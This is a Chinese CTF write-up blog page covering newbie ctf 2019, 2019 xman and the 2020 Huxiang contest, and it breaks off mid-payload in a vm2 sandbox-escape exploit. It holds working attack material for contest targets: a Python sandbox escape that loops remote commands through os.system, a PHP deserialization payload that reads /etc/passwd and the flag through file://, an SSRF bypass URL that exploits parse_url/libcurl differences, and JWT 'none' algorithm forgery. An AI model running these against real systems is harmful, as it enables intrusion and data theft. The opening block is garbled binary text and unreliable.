<h2 id="misc-1"><a href="#misc-1" class="headerlink" title="misc 1"></a>misc 1</h2><pre><code>I¤Ìçz6j|´±¥ó¼¹[ƂĄʃz@ałޢ|ӄɒak@ałޢŅyĉӡk@ałޒ|ӄɒak@֋@JBťɁÉ֕k@ŧÅՄń@Ձ٨@ÖąŀąÉԁԀɕÅكȁՇƀÖąZ@U@SӅǅŀÈYCÅڀĀĢń@֕@ʂՀĉՖęË@ɣ@ŧɢâ@ɕ@c@ӅbĀȀԤäSӨ@ɕÖԗcɂӅ@Ņ٢ɖբk@SԀƅcęɕȀ¤È@ąӉǈâ@b@Ֆ֠ÖգɇĖĢ@Ӆãř@ؤŕÅÀUŀÈƀBՃƀֆ@ŅفԀ¢ĉʀפՃäcɖրÈYCÅ٢@ƁəӨ@ɔז٣UĀƖڀԖąٕ@Öԗģř@ӁՇāǅÀMŧCÓɀƈɃɀÈYCÅ٢@YƀBգ@ŁىŢ@CÖلɕȀÖ@ƈɃɀŅ٢ɖրֆ@ƂĄʃ@ȖŽم@Ӗ֒ɕȀc]K@ʂՀDWÅŀƂĄʃ@ƙ֔@פՃȅŀÁل@Öą@ɕ@ÈƀŁٓɀ񹶰ÀUŀי֔ēǁÅŀɣ@b@ä£֔ř`ÖգٖԀÁãɃ@MƀÖՕŃÖڀÖբ׉فè]k@ęՉՇ@ÈƀSمDɀŢÁɢȅŀ¢ĉʀ£UāلK@㖄hk@ʂՀÓIԢ@Ö@@U@֗ŕ`¨£ŔÀÖԗUɫ@¤ĀʂսÀ֦րąىףɖրֆ@ÈƀƂĄʃ@ŁىUâ@UŀȖǀÖ@ÖեřĀæŅրÈŔ@ɢ@£ɓԀɕÅٕSӨ@ÓbƉń@ÖؠÙţk@¤ٕ`Ɩم`مDɕȋ@ȁÒřÀUÈ@c@ÈƀŅ٨@Ձԅ@ֆ@ƂĄʃ@UŀÖբɄř@ɣ@ԁՉƅ£cɖրֆ@פم£@ťɓKƓG@ɢ@ƓGp°��ƴ����򴄴𰲳ǰƄÅ�</code></pre><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/04/20/eis2019/">http://blog.ccreater.top/2020/04/20/eis2019/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/04/20/eis2019/" data-id="cka3ckr2r0021v4v04ovuf8nr" data-title="eis2019" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-nbctf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/04/20/nbctf/" class="article-date">
  <time class="dt-published" datetime="2020-04-20T12:49:27.394Z" itemprop="datePublished">2020-04-20</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/04/20/nbctf/">newbie ctf 2019</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="newbie-ctf-2019"><a href="#newbie-ctf-2019" class="headerlink" title="newbie ctf 2019"></a>newbie ctf 2019</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="normal-host"><a href="#normal-host" class="headerlink" title="normal_host"></a>normal_host</h3><p>题目描述:</p>
<blockquote>
<p>You can get flag in “normalflag.iwinv.net”</p>
</blockquote>
<p>题目给的链接</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kogjizorj30ue0gvngf.jpg" alt="image.png"></p>
<p>直接访问 flag</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kofgp0d7j312909paar.jpg" alt="image.png"></p>
<p>输入网站测试发现,会在网址后面加个secret参数</p>
<p><img src="C:%5CUsers%5C%E8%94%A1%E5%BB%BA%E6%96%8C%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191103111420354.png" alt="image-20191103111420354"></p>
<p>而flag界面就是通过这个secret来识别是否通过internal.iwinv.net</p>
<p>观察secret发现，每次访问给出的secret都不一样</p>
<p>排除掉算出secret的做法,那么接下来就是要绕过禁用host的限制或者是输入一个网址，让其无法识别出是<code>normalflag.iwinv.net</code>却能访问<code>normalflag.iwinv.net</code></p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kolppcsfj30g3045748.jpg" alt="image.png"></p>
<p>这就很容易想到php里面libcurl和parase的差异</p>
<blockquote>
<p>parse_url与libcurl对与url的解析差异可能导致ssrf当url中有多个@符号时，parse_url中获取的host是最后一个@符号后面的host，而libcurl则是获取的第一个@符号之后的。因此当代码对<a href="http://user@eval.com:80@baidu.com进行解析时，PHP获取的host是baidu.com是允许访问的域名，而最后调用libcurl进行请求时则是请求的eval.com域名，可以造成ssrf绕过此外对于https://evil@baidu.com这样的域名进行解析时,php获取的host是evil@baidu.com，但是libcurl获取的host却是evil.com" target="_blank" rel="noopener">http://user@eval.com:80@baidu.com进行解析时，PHP获取的host是baidu.com是允许访问的域名，而最后调用libcurl进行请求时则是请求的eval.com域名，可以造成ssrf绕过此外对于https://evil@baidu.com这样的域名进行解析时,php获取的host是evil@baidu.com，但是libcurl获取的host却是evil.com</a> </p>
<p>from  <a href="https://paper.seebug.org/561" target="_blank" rel="noopener">https://paper.seebug.org/561</a> </p>
</blockquote>
<p>构造url:<code>user@4399.com@normalflag.iwinv.net</code>(我是来帮4399打广告的:v:)​</p>
<p>KorNewbie{H0$7_$P1it_A774cK_U$3s_N0RM^liZ47ioN&amp;##$%%!}</p>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="catch-me"><a href="#catch-me" class="headerlink" title="catch me"></a>catch me</h3><p>利用工具逐帧查看，把每个子出现的位置记录转成ascii码得到flag</p>
<p>KorNewbie{w0w_e4g1e_3y3}</p>
<h3 id="BiMilCode"><a href="#BiMilCode" class="headerlink" title="BiMilCode"></a>BiMilCode</h3><p><img src="http://ww1.sinaimg.cn/large/006pWR9aly1g8kovw3cl4j30e704pt8u.jpg" alt="image.png"></p>
<p>刚开始题目说要encode。结果被这个误解搞了一个小时才发现是decode</p>
<p>观察发现一个字符会被编码成2位的16进制的数据</p>
<p>认真观察发现编码方式还和位置有关，但是相同的位置编码方式相同,而且只是对ascii码进行移位</p>
<p>也就是说,在同一个会话里,我们可以通过ascii码的差值来得到来计算出题目给出的编码后的字符串</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kp8m10vej30ep058jrl.jpg" alt="image.png"></p>
<pre><code class="python">s2=&#39;45 dd 97 38 62 6c 62 85&#39;.split(&#39; &#39;)
s1=&#39;3a 93 78 3a 6c 63 3a 63&#39;.split(&#39; &#39;)
print(s1)
print(s2)
for i in range(len(s1)):
    print(chr(ord(&#39;0&#39;)+int(s1[i],16)-int(s2[i],16)),end=&#39;&#39;)</code></pre>
<p>KorNewbie{Nace_I_believed_it}</p>
<h2 id="Forensic"><a href="#Forensic" class="headerlink" title="Forensic"></a>Forensic</h2><h3 id="find-the-plain"><a href="#find-the-plain" class="headerlink" title="find the plain"></a>find the plain</h3><p>题目描述</p>
<blockquote>
<p>Alpha team’s whistleblower captured a packet that leaked internal information to the outside using ftp internal confidential data.</p>
<p>Analyze the packet and flag the password and information obtained for the ftp connection!</p>
<p>flag format : KorNewbie{password_yougetinformation}</p>
<p>※ If there is a hash value, it will be md5.</p>
</blockquote>
<p>用<code>(!frame.len== 1518) &amp;&amp;(!frame.len== 1514)&amp;&amp; (! ip.addr==192.229.232.240) &amp;&amp; (not tcp.stream==2) &amp;&amp; (not tcp.stream==0)&amp;&amp; (not tcp.stream==1)</code></p>
<p>过滤找到ftp传输文件和账号密码</p>
<p>password:root</p>
<p>badguy.txt</p>
<pre><code>7J2067O06rKMIOyVjO2MjO2MgOydmCDsi6Dsg4HsoJXrs7TripQg67CR7J2YIOyjvOyGjOyXkCDrqqjrkZAg64u07JWE64aT7JWY64SkLiDqsbTtiKzrpbwg67mM7KeA7JuM7YSwLi4gDQpodHRwczovL3Bhc3RlYmluLmNvbS83MHlER2lSUw==</code></pre><p>decode得到</p>
<pre><code>이보게 알파팀의 신상정보는 밑의 주소에 모두 담아놓았네. 건투를 빌지워터.. 
//alpha组的个人信息全部放在下面的地址里。祝你成功..
https://pastebin.com/70yDGiRS</code></pre><p><code>k459iki6m5j094m2lmkhjmi9527l81ml</code></p>
<p>题目提示得到的一个信息是md5</p>
<p>所以对这个进行凯撒密码解密得到<code>d459bdb6f5c094f2efdacfb9527e81fe</code></p>
<p>后面发现<img src="http://ww1.sinaimg.cn/large/006pWR9aly1g8k0vd6qapj30ue015gli.jpg" alt="image.png"></p>
<p>这里也提示了凯撒加密</p>
<p>但是用国内的md5解密网站无论如何也破不了</p>
<p>用朝鲜语搜了一下就解密了</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8k0ww99j0j30j6036t8w.jpg" alt="image.png"></p>
<p>KorNewbie{root_IronDragon}</p>
<p>………………………</p>
<p>这是个梗吗.</p>
<h3 id="chat"><a href="#chat" class="headerlink" title="chat"></a>chat</h3><p>题目描述</p>
<blockquote>
<p>Confidential information came and went through chat. Find the email of the user who used the chat. </p>
</blockquote>
<p>user:NewbieCTF2019</p>
<p>在youtube找到一个好玩的重置密码的方法</p>
<p> <a href="https://www.youtube.com/watch?v=YBFAzK9mgNI" target="_blank" rel="noopener">https://www.youtube.com/watch?v=YBFAzK9mgNI</a> </p>
<p>根据这个来重置密码</p>
<p>重置密码后看着棒子文我是懵逼的(同伴+1)</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kph085tzj31gw0see6k.jpg" alt="image.png"></p>
<p>根据题目提示聊天软件理所当然的盯上了kakao</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kppnap1sj30wj0b60u7.jpg" alt="image.png"></p>
<p>跑到文件夹里翻一翻(也可以写个脚本/fad)</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kpqxb2njj30tz0j8my5.jpg" alt="image.png"></p>
<p>最后拿到flag</p>
<p><code>KorNewbie{renek@it-simple.net}</code></p>
<h3 id="rec"><a href="#rec" class="headerlink" title="rec"></a>rec</h3><p>这题跟进去调试也没看到啥，想来想去防止取证题的地方怎么也不可能是逆向啥的、</p>
<p>于是就开始用binwalk,strings…..</p>
<p>最后翻一翻找到了seg段…………</p>
<p>在seg段找到</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9aly1g8k2xe25wlj30io0gbdio.jpg" alt="image.png"></p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/04/20/nbctf/">http://blog.ccreater.top/2020/04/20/nbctf/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/04/20/nbctf/" data-id="cka3ckr33002yv4v0ebst1y7k" data-title="newbie ctf 2019" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-2019xman个人排位赛wp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/04/20/2019xman%E4%B8%AA%E4%BA%BA%E6%8E%92%E4%BD%8D%E8%B5%9Bwp/" class="article-date">
  <time class="dt-published" datetime="2020-04-20T12:44:22.257Z" itemprop="datePublished">2020-04-20</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/04/20/2019xman%E4%B8%AA%E4%BA%BA%E6%8E%92%E4%BD%8D%E8%B5%9Bwp/">2019xman个人排位赛wp</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="escape"><a href="#escape" class="headerlink" title="escape"></a>escape</h2><p>收获:了解了python沙箱逃逸这种类型</p>
<p>getattr:对沙箱逃逸有很大作用</p>
<p>list(s)获得字符集,可以用来绕过引号限制</p>
<p>试了一下system</p>
<pre><code class="python">banned=  [&quot;&#39;&quot;, &#39;&quot;&#39;, &#39;.&#39;, &#39;reload&#39;, &#39;open&#39;, &#39;input&#39;, &#39;file&#39;, &#39;if&#39;, &#39;else&#39;, &#39;eval&#39;, &#39;exit&#39;, &#39;import&#39;, &#39;quit&#39;, &#39;exec&#39;, &#39;code&#39;, &#39;const&#39;, &#39;vars&#39;, &#39;str&#39;, &#39;chr&#39;, &#39;ord&#39;, &#39;local&#39;, &#39;global&#39;, &#39;join&#39;, &#39;format&#39;, &#39;replace&#39;, &#39;translate&#39;, &#39;try&#39;, &#39;except&#39;, &#39;with&#39;, &#39;content&#39;, &#39;frame&#39;, &#39;back&#39;]</code></pre>
<p>发现引号和点都被过滤了,不过提示说</p>
<pre><code class="python">def hello():
   os.system(&quot;echo hello&quot;)</code></pre>
<p>说明是可以通过调用system来完成,接下来就是想办法得到system函数了</p>
<p>而引号被过滤可以用字符串s里的值来绕过</p>
<pre><code class="python">#考虑这样来
a=getattr(os,&#39;system&#39;)
a(&quot;命令&quot;)</code></pre>
<pre><code class="python">def get_str(string):
    result=&#39;&#39;
    for i in string:
        result+=&#39;table[&#39;+str(table.index(i))+&#39;]+&#39;
    return result[:-1]
conn=remote(&#39;47.97.253.115&#39;,10005)
conn.sendline(&#39;table=list(s)&#39;)
conn.sendline(&#39;sys=&#39;+get_str(&#39;system&#39;))
conn.sendline(&#39;fun=getattr(os,sys)&#39;)
while 1:
        command=input(&#39;(www):$&#39;)
        new_com=&#39;fun(&#39;+get_str(command)+&#39;)&#39;
        conn.sendline(new_com)
        print(conn.recvuntil(&#39;&gt;&gt;&gt;&#39;))
conn.close()
</code></pre>
<p>flag{4EEAA88DA0B3207862D2E4876AF84A3D}</p>
<h2 id="strange-ssid"><a href="#strange-ssid" class="headerlink" title="strange_ssid"></a>strange_ssid</h2><p>这题是结束听别人讲的</p>
<p>所有的数据都是32个字符</p>
<p>所以猜测是md5加密</p>
<p>找出符合md5格式的数据</p>
<p>68dffd5a1be838b5326209714f7ea7a5</p>
<p>解密后提交flag{n3k0}失败</p>
<p>直接提交flag{68dffd5a1be838b5326209714f7ea7a5}试试</p>
<p>成功</p>
<h2 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a><strong>ezphp</strong></h2><p>收获:知道了curl_exec 本地文件读取</p>
<pre><code class="php">&lt;?php

class Hello {
    protected $a;

    function test() {
        $b = strpos($this-&gt;a, &#39;flag&#39;);
        if($b) {
            die(&quot;Bye!&quot;);
        }
        $c = curl_init();
        curl_setopt($c, CURLOPT_URL, $this-&gt;a);
        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($c, CURLOPT_CONNECTTIMEOUT, 5);
        echo curl_exec($c);
    }

    function __destruct(){
        $this-&gt;test();
    }
}

if (isset($_GET[&quot;z&quot;])) {
    unserialize($_GET[&quot;z&quot;]);
} else {
    highlight_file(__FILE__);
}</code></pre>
<p>curl_exec+反序列化</p>
<p>试了下本地文件读取</p>
<p>O:5:”Hello”:1:{s:1:”a”;s:27:”file://localhost/etc/passwd”;}</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g5uwj7l0c4j30wp0ax407.jpg" alt="image1967"></p>
<p>题目过滤flag字符</p>
<p>说明我们flag就在flag文件里</p>
<p>谷歌看了好久，后来看一道又curl_exec的题目，获得了url二次编码的思路</p>
<p>最后的payload:</p>
<p><a href="http://47.97.253.115:10006/?z=O:5:%22Hello%22:1:{s:1:%22a%22;s:23:%22file://localhost/%2566lag%22;}" target="_blank" rel="noopener">http://47.97.253.115:10006/?z=O:5:%22Hello%22:1:{s:1:%22a%22;s:23:%22file://localhost/%2566lag%22;}</a></p>
<p>这里有一些坑就是:</p>
<ol>
<li><p>你不知道flag文件在哪个文件夹,结果最后就在根目录。。</p>
</li>
<li><p>因为是二次编码所以要注意字符串的长度</p>
</li>
</ol>
<h2 id="onion’s-secret"><a href="#onion’s-secret" class="headerlink" title="onion’s_secret"></a><strong>onion’s_secret</strong></h2><p>下载得到一个压缩包，常规的检查走一遍</p>
<p>发现onion.jpg文件尾后还有数据</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g5uwp2ulyrj30jj079dif.jpg" alt="image2357"></p>
<p>zip格式,get一个新的加密压缩包</p>
<p>密码在hint里有提示</p>
<p>接下来就是很普通的写python了</p>
<pre><code class="python">import zipfile
def burp(filename,hint):
    password=&#39;&#39;
    i=0
    for i in range(32,128):
        password=hint.replace(&#39;?&#39;,chr(i))
        with zipfile.ZipFile(filename) as myzip:
            try :
                print(&quot;解密:&quot;+filename+&quot;:&quot;+password)
                myzip.read(&#39;onion.zip&#39;,pwd=bytes(password,encoding=&#39;ascii&#39;))
                break
                return password
            except RuntimeError: 
                print(&quot;解密失败&quot;)
            except FileNotFoundError:
                input(&#39;过来康康&#39;)
            except zipfile.zlib.error:
                print(&quot;跳过&quot;)
    if i==127:
        print(&quot;爆破失败&quot;)
        exit()
    print(&#39;爆破成功&#39;+password)
    return password

def writebyte(bbyte,filename):
    f=open(filename,&#39;wb&#39;)
    f.write(bbyte)
    f.close()
def readbyte(filename):
    f=open(filename,&#39;rb&#39;)
    bbyte=f.read()
    f.close()
    return bbyte

nullbyte=b&#39;&#39;
while 1:
    f=open(&#39;temp.txt&#39;,&#39;r&#39;)
    hint=f.read()[12:]
    f.close()
    pwd=burp(&#39;onion1.zip&#39;,hint)

    with zipfile.ZipFile(&#39;onion1.zip&#39;) as myzip:
        str=myzip.read(&#39;onion.zip&#39;,pwd=bytes(pwd,encoding=&#39;ascii&#39;))
        writebyte(str,&quot;temp.zip&quot;)
        str=myzip.read(&#39;hint.txt&#39;,pwd=bytes(pwd,encoding=&#39;ascii&#39;))
        writebyte(str,&quot;temp.txt&quot;)
    writebyte(readbyte(&#39;temp.zip&#39;),&#39;onion1.zip&#39;)

</code></pre>
<h2 id="commom-encrypt"><a href="#commom-encrypt" class="headerlink" title="commom_encrypt"></a><strong>commom_encrypt</strong></h2><p>读代码就完事了</p>
<pre><code class="python">def encrypt(data,groupnums):
    a=[]
    b=[]
    section=int(len(data)/groupnums)
    for i in range(0,len(data),section):
        a.append(data[i:i+section])
    for i in range(section):
        for j in range(groupnums):
            b.append(a[j][i])
    cipher=(&#39;&#39;.join(chr(ord(b[i])^i) for i in range(len(b))))
    return cipher
def decrypt(data):
    result=[]
    for i in range(1,len(data)+1):
        result.append(encrypt(data,i))
    return result

may_r=decrypt(&#39;f^n2ekass:iy~&gt;w|`ef&quot;${Ip)8if&#39;)
for i in may_r:
    print(i[::2]+i[1::2])</code></pre>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/04/20/2019xman个人排位赛wp/">http://blog.ccreater.top/2020/04/20/2019xman个人排位赛wp/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/04/20/2019xman%E4%B8%AA%E4%BA%BA%E6%8E%92%E4%BD%8D%E8%B5%9Bwp/" data-id="cka3ckr1o0002v4v00vwvd36g" data-title="2019xman个人排位赛wp" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-2020数字中国创新大赛-虎符网络安全" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/04/20/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B-%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="article-date">
  <time class="dt-published" datetime="2020-04-20T02:39:54.120Z" itemprop="datePublished">2020-04-20</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/04/20/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B-%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">2020数字中国创新大赛-虎符网络安全</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="easy-login"><a href="#easy-login" class="headerlink" title="easy_login"></a>easy_login</h3><p>在static/js/app.js中发现</p>
<pre><code class="javascript">/**
 *  或许该用 koa-static 来处理静态文件
 *  路径该怎么配置？不管了先填个根目录XD
 */</code></pre>
<p>于是直接访问app.js</p>
<pre><code class="javascript">const Koa = require(&#39;koa&#39;);
const bodyParser = require(&#39;koa-bodyparser&#39;);
const session = require(&#39;koa-session&#39;);
const static = require(&#39;koa-static&#39;);
const views = require(&#39;koa-views&#39;);

const crypto = require(&#39;crypto&#39;);
const { resolve } = require(&#39;path&#39;);

const rest = require(&#39;./rest&#39;);
const controller = require(&#39;./controller&#39;);

const PORT = 80;
const app = new Koa();

app.keys = [crypto.randomBytes(16).toString(&#39;hex&#39;)];
global.secrets = [];

app.use(static(resolve(__dirname, &#39;.&#39;)));

app.use(views(resolve(__dirname, &#39;./views&#39;), {
  extension: &#39;pug&#39;
}));

app.use(session({key: &#39;sses:aok&#39;, maxAge: 86400000}, app));

// parse request body:
app.use(bodyParser());

// prepare restful service
app.use(rest.restify());

// add controllers:
app.use(controller());

app.listen(PORT);
console.log(`app started at port ${PORT}...`);</code></pre>
<p>然后rest.js</p>
<pre><code class="javascript">module.exports = {
    APIError: function (code, message) {
        this.code = code || &#39;internal:unknown_error&#39;;
        this.message = message || &#39;&#39;;
    },
    restify: () =&gt; {
        const pathPrefix = &#39;/api/&#39;;
        return async (ctx, next) =&gt; {
            if (ctx.request.path.startsWith(pathPrefix)) {
                ctx.rest = data =&gt; {
                    ctx.response.type = &#39;application/json&#39;;
                    ctx.response.body = data;
                };
                try {
                    await next();
                } catch (e) {
                    ctx.response.status = 400;
                    ctx.response.type = &#39;application/json&#39;;
                    ctx.response.body = {
                        code: e.code || &#39;internal_error&#39;,
                        message: e.message || &#39;&#39;
                    };
                }
            } else {
                await next();
            }
        };
    }
};</code></pre>
<p>controller.js</p>
<pre><code class="javascript">const fs = require(&#39;fs&#39;);

function addMapping(router, mapping) {
    for (const url in mapping) {
        if (url.startsWith(&#39;GET &#39;)) {
            const path = url.substring(4);
            router.get(path, mapping[url]);
        } else if (url.startsWith(&#39;POST &#39;)) {
            const path = url.substring(5);
            router.post(path, mapping[url]);
        } else {
            console.log(`invalid URL: ${url}`);
        }
    }
}

function addControllers(router, dir) {
    fs.readdirSync(__dirname + &#39;/&#39; + dir).filter(f =&gt; {
        return f.endsWith(&#39;.js&#39;);
    }).forEach(f =&gt; {
        const mapping = require(__dirname + &#39;/&#39; + dir + &#39;/&#39; + f);
        addMapping(router, mapping);
    });
}

module.exports = (dir) =&gt; {
    const controllers_dir = dir || &#39;controllers&#39;;
    const router = require(&#39;koa-router&#39;)();
    addControllers(router, controllers_dir);
    return router.routes();
};</code></pre>
<p>fuzz controllers目录得到</p>
<p>api.js</p>
<pre><code class="javascript">const crypto = require(&#39;crypto&#39;);
const fs = require(&#39;fs&#39;)
const jwt = require(&#39;jsonwebtoken&#39;)

const APIError = require(&#39;../rest&#39;).APIError;

module.exports = {
    &#39;POST /api/register&#39;: async (ctx, next) =&gt; {
        const {username, password} = ctx.request.body;

        if(!username || username === &#39;admin&#39;){
            throw new APIError(&#39;register error&#39;, &#39;wrong username&#39;);
        }

        if(global.secrets.length &gt; 100000) {
            global.secrets = [];
        }

        const secret = crypto.randomBytes(18).toString(&#39;hex&#39;);
        const secretid = global.secrets.length;
        global.secrets.push(secret)

        const token = jwt.sign({secretid, username, password}, secret, {algorithm: &#39;HS256&#39;});

        ctx.rest({
            token: token
        });

        await next();
    },

    &#39;POST /api/login&#39;: async (ctx, next) =&gt; {
        const {username, password} = ctx.request.body;

        if(!username || !password) {
            throw new APIError(&#39;login error&#39;, &#39;username or password is necessary&#39;);
        }

        const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;

        const sid = JSON.parse(Buffer.from(token.split(&#39;.&#39;)[1], &#39;base64&#39;).toString()).secretid;

        console.log(sid)

        if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) {
            throw new APIError(&#39;login error&#39;, &#39;no such secret id&#39;);
        }

        const secret = global.secrets[sid];

        const user = jwt.verify(token, secret, {algorithm: &#39;HS256&#39;});

        const status = username === user.username &amp;&amp; password === user.password;

        if(status) {
            ctx.session.username = username;
        }

        ctx.rest({
            status
        });

        await next();
    },

    &#39;GET /api/flag&#39;: async (ctx, next) =&gt; {
        if(ctx.session.username !== &#39;admin&#39;){
            throw new APIError(&#39;permission error&#39;, &#39;permission denied&#39;);
        }

        const flag = fs.readFileSync(&#39;/flag&#39;).toString();
        ctx.rest({
            flag
        });

        await next();
    },

    &#39;GET /api/logout&#39;: async (ctx, next) =&gt; {
        ctx.session.username = null;
        ctx.rest({
            status: true
        })
        await next();
    }
};</code></pre>
<p>view.js</p>
<pre><code class="javascript">module.exports = {
    &#39;GET /&#39;: async (ctx, next) =&gt; {
        ctx.status = 302;    
        ctx.redirect(&#39;/home&#39;);
    },
    &#39;GET /login&#39;: async (ctx, next) =&gt; {
        if(ctx.session.username) {
            ctx.status = 302;    
            await ctx.redirect(&#39;/home&#39;);
        } else {
            await ctx.render(&#39;login&#39;);
            await next();
        }
    },
    &#39;GET /register&#39;: async (ctx, next) =&gt; {
        if(ctx.session.username) {
            ctx.status = 302;    
            await ctx.redirect(&#39;/home&#39;);
        } else {
            await ctx.render(&#39;register&#39;);
            await next();
        }
    },
    &#39;GET /home&#39;: async (ctx, next) =&gt; {
        if(!ctx.session.username) {
            ctx.status = 302;    
            await ctx.redirect(&#39;/login&#39;);
        } else {
            await ctx.render(&#39;home&#39;, {
                username: ctx.session.username,
            });
            await next();
        }
    }
};</code></pre>
<p>阅读代码发现：</p>
<pre><code class="javascript">
const sid = JSON.parse(Buffer.from(token.split(&#39;.&#39;)[1], &#39;base64&#39;).toString()).secretid;
if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) {
            throw new APIError(&#39;login error&#39;, &#39;no such secret id&#39;);
        }
const secret = global.secrets[sid];
//验证之前</code></pre>
<p>我们可以控制sid来选择任意的密钥</p>
<p> node 的jsonwebtoken库存在一个缺陷，也是jwt的常见攻击手法，当用户传入jwt secret为空时 jsonwebtoken会采用algorithm none进行解密 </p>
<p>我们令<code>sid=false</code>,则可以通过</p>
<pre><code>if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) {
            throw new APIError(&#39;login error&#39;, &#39;no such secret id&#39;);
        }</code></pre><p>的验证，且<code>global.secrets[sid]=undefined</code></p>
<p>最后的payload</p>
<pre><code class="python">import jwt
import json
a=json.loads(&#39;&#39;&#39;{
        &quot;secretid&quot;: false,
        &quot;username&quot;:&quot;admin&quot;,
        &quot;password&quot;: &quot;admin&quot;,
        &quot;iat&quot;: 1587310401
}&#39;&#39;&#39;)
print(jwt.encode(a, key=&quot;&quot;, algorithm=&#39;none&#39;))</code></pre>
<h3 id="just-escape"><a href="#just-escape" class="headerlink" title="just_escape"></a>just_escape</h3><pre><code>数学运算
code: (2+6-7)/3

run online: /run.php?code=(2%2b6-7)/3;

Ouput: 0.3333333333333333

注意编码 =.=

时间戳
code: new Date();

run online: /run.php?code=new%20Date();

Ouput: Fri Nov 22 2019 15:39:22 GMT+0800 (China Standard Time)

真的是 PHP 嘛</code></pre><p>刚开始还真的以为是php,再输入console的时候返回 <code>[object Object]</code>，这题应该是nodejs</p>
<p>在网上找到<a href="https://blog.zeddyu.info/2019/02/14/Hackim-2019/#BabyJS" target="_blank" rel="noopener">类似的题目</a></p>
<p>在vm2的issue中找到 <a href="https://github.com/patriksimek/vm2/issues/225" target="_blank" rel="noopener">https://github.com/patriksimek/vm2/issues/225</a> </p>
<p>payload:</p>
<pre><code class="javascript">const axios = require(&#39;axios&#39;)
const untrusted = &#39;(&#39; + function(){
    TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)();
    try{
